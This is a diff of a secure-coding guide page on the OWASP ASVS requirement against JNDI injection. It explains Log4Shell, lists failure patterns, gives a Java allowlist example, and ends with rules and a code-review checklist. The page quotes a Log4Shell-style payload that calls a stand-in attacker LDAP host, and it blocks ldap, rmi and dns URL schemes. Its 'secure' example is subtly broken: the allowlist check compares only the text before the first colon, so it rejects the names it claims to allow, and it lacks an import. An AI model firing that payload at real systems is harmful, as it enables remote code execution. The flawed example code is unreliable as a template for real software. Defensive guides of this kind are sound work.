@@ -24,6 +24,65 @@ references:
     url: https://owasp.org/www-project-application-security-verification-standard/
 ---
 
-## Requirement
+## What This Control Means
 
-Verify that the application appropriately sanitizes untrusted input before use in Java Naming and Directory Interface (JNDI) queries and that JNDI is configured securely to prevent JNDI injection attacks.
+Java Naming and Directory Interface (JNDI) resolves names such as `ldap://`, `rmi://`, or `dns://` to look up objects and resources. JNDI injection — famously exploited by Log4Shell — occurs when untrusted input reaches a JNDI *lookup*, causing the JVM to contact an attacker-controlled server and, in vulnerable configurations, load and execute remote code. This control requires sanitizing any value before a JNDI lookup and locking down the configuration.
+
+## Why This Matters
+
+The `log4j` incident showed how a single logged string (`${jndi:ldap://attacker/...}`) leads to remote code execution when a library performs a JNDI lookup with untrusted data. Any component that resolves names from user input — logging, serialization, LDAP bind helpers — inherits this risk, making it a platform-wide concern rather than a single-application bug.
+
+## Main Security Requirement
+
+> Verify that the application appropriately sanitizes untrusted input before use in Java Naming and Directory Interface (JNDI) queries and that JNDI is configured securely to prevent JNDI injection attacks.
+
+## Common Failure Patterns
+
+- Passing logged or user data directly to `InitialContext.lookup(...)`.
+- Leaving `com.sun.jndi.ldap.object.trustURLCodebase=true` (remote codebase loading enabled).
+- Allowing arbitrary URL schemes in names (`ldap://`, `rmi://`, `dns://`).
+- Downgrading vulnerable logging/deserialization libraries instead of patching.
+- Assuming "we never use JNDI" without checking library dependencies.
+
+## Secure Implementation
+
+Do not JNDI-lookup untrusted strings; if a lookup is required, validate against a strict allowlist and reject URL schemes:
+
+```java
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+private static final Set<String> ALLOWED = Set.of("java:comp/env");
+
+Object safeLookup(String name) throws Exception {
+    for (String bad : new String[]{"ldap://", "rmi://", "dns://", "//"}) {
+        if (name.toLowerCase().contains(bad)) {
+            throw new IllegalArgumentException("JNDI URL not allowed");
+        }
+    }
+    int colon = name.indexOf(':');
+    if (colon > 0 && !ALLOWED.contains(name.substring(0, colon))) {
+        throw new IllegalArgumentException("JNDI scheme not allowed");
+    }
+    Context ctx = new InitialContext();
+    return ctx.lookup(name);
+}
+```
+
+Harden the runtime: disable remote object codebase loading, upgrade logging/deserialization libraries, and keep untrusted data out of lookup paths entirely.
+
+## Key Rules
+
+- Treat any JNDI lookup of user-influenced strings as a vulnerability.
+- Never allow URL schemes (`ldap://`, `rmi://`, `dns://`) in untrusted names.
+- Disable `trustURLCodebase` / remote class loading globally.
+- Sanitize or allowlist names before lookup; prefer `java:comp/env` names only.
+- Patch logging, LDAP, and deserialization libraries promptly.
+
+## Checklist for Code Review
+
+- Does any untrusted value reach `InitialContext.lookup` or similar?
+- Are URL-style names (`ldap://`, `rmi://`, `dns://`) blocked or allowlisted?
+- Is remote codebase/class loading disabled in the JVM and libraries?
+- Are names restricted to an allowlist such as `java:comp/env`?
+- Are vulnerable logging/deserialization libraries patched to fixed versions?
